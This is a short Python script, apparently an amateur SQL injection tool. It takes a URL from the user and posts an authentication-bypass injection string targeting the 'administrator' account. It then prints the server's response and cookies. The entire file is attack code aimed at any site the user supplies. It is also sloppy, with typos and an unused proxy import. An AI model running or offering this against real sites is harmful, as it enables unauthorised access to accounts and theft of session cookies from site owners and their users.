from settings import SQL_INJECT_REQUESTS 
from head import userahents, proxies

import requests, random 

headers = { 
    "User-Agent": random.choice(userahents)
} 
url = input("URL: ")

response = requests.get(url=url, headers=headers) 

if response.status_code == 200: 
    con_url = url + "?param="+ SQL_INJECT_REQUESTS[9]  
    payload = { 
        "query": "SELECT * FROM users WHERE username = 'administrator'--' AND password = ''"
    }
    response_attck = requests.post(url=con_url, headers=headers, data=payload, params="SELECT * FROM users WHERE username = 'administrator'--' AND password = ''") 
    print(response_attck.text) 
    print(response_attck.cookies) 

else: 
    print(f"Erorr {response.status_code}")
    